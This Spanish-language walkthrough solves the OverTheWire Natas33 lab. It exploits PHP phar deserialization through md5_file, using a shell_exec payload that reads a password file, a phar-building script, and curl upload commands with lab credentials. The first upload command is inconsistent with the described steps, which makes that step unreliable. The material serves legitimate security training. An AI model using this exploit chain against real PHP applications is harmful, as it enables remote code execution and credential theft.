# Natas33

#### URL: http://natas33.natas.labs.overthewire.org
#### Credenciales: natas33:2v9nDlbSF7jvawaCncr5Z9kSzkmBeoCJ 

Existe un objeto Executor que ejecuta un archivo especificado por su atributo $filename con el interprete de php si su hash md5 es igual a $signature en el destructor:
``` php
<?php
            // graz XeR, the first to solve it! thanks for the feedback!
            // ~morla
            class Executor{
                private $filename=""; 
                private $signature='adeafbadbabec0dedabada55ba55d00d';
                private $init=False;

                function __construct(){
                    $this->filename=$_POST["filename"];
                    if(filesize($_FILES['uploadedfile']['tmp_name']) > 4096) {
                        echo "File is too big<br>";
                    }
                    else {
                        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], "/natas33/upload/" . $this->filename)) {
                            echo "The update has been uploaded to: /natas33/upload/$this->filename<br>";
                            echo "Firmware upgrad initialised.<br>";
                        }
                        else{
                            echo "There was an error uploading the file, please try again!<br>";
                        }
                    }
                }

                function __destruct(){
                    // upgrade firmware at the end of this script

                    // "The working directory in the script shutdown phase can be different with some SAPIs (e.g. Apache)."
                    chdir("/natas33/upload/");
                    if(md5_file($this->filename) == $this->signature){
                        echo "Congratulations! Running firmware update: $this->filename <br>";
                        passthru("php " . $this->filename);
                    }
                    else{
                        echo "Failur! MD5sum mismatch!<br>";
                    }
                }
            }
        ?>
```

No tenemos una funcion para deserializar pero la funcion md5_file es vulnerable a PHP Object Injection puesto que un parametro como 'phar://[phar_file].phar' deserializara el objeto dentro de Metadata e invocara el destructor:
``` php
if(md5_file($this->filename) == $this->signature){
```

Pasos para explotar la vunerabilidad:
- Crear un archivo php con la carga util
- Crear un archivo phar con un objeto Executor en los metadatos con su atributo $filename conteniendo el nombre de nuestro archivo php (no la ruta completa debido a que en `chdir("/natas33/upload/");` ya se encuentra en el directorio correcto)
- Subir ambos archivos
- Subir el archivo phar de nuevo pero esta vez con el nombre phar://shell.phar para provocar la deserializacion

Creamos un archivo php malicioso
``` shell.php
<?php echo shell_exec('cat /etc/natas_webpass/natas34'); ?>
```

Subimos el archivo
```
curl -u natas33:2v9nDlbSF7jvawaCncr5Z9kSzkmBeoCJ http://natas33.natas.labs.overthewire.org/ -F uploadedfile=@/home/kalcast/Laboratorio/shell.phar -F MAX_FILE_SIZE=4096 -F filename=shell.php
```

Creamos el archivo phar
``` php
// phar_template.php
 <?php
 // payload.php
 // Compile with: php --define phar.readonly=0 payload.php

class Executor                                  // <- Replace with your own class/es
{
                private $filename="shell.php";
                private $signature=True;
                private $init=False;
}

$phar = new Phar('shell.phar');              // <- Compilation generates a 'shell.phar' file
$phar->startBuffering();
$phar->addFromString('test.txt','text');

// Signature bytes
$phar->setStub("<?php __HALT_COMPILER(); ?>");         // <- Replace if you have to bypass any verification

$object = new Executor();                      // <- Replace with your own class/es
$phar->setMetadata($object);
$phar->stopBuffering();
?>
```

Compilamos y subimos el archivo phar
```
php --define phar.readonly=0 phar_template.php && curl -u natas33:2v9nDlbSF7jvawaCncr5Z9kSzkmBeoCJ http://natas33.natas.labs.overthewire.org/ -F uploadedfile=@/home/kalcast/Laboratorio/shell.phar -F MAX_FILE_SIZE=4096 -F filename=shell.phar
```

Ejecutar el phar y hacer el ataque de deserializacion
```
 php --define phar.readonly=0 phar_template.php && curl -u natas33:2v9nDlbSF7jvawaCncr5Z9kSzkmBeoCJ http://natas33.natas.labs.overthewire.org/ -F uploadedfile=@/home/kalcast/Laboratorio/shell.phar -F MAX_FILE_SIZE=4096 -F filename=phar://shell.phar
...
Congratulations! Running firmware update: shell.php <br>j4O7Q7Q5er5XFRCepmyXJaWCSIrslCJY
```

`natas34:j4O7Q7Q5er5XFRCepmyXJaWCSIrslCJY`

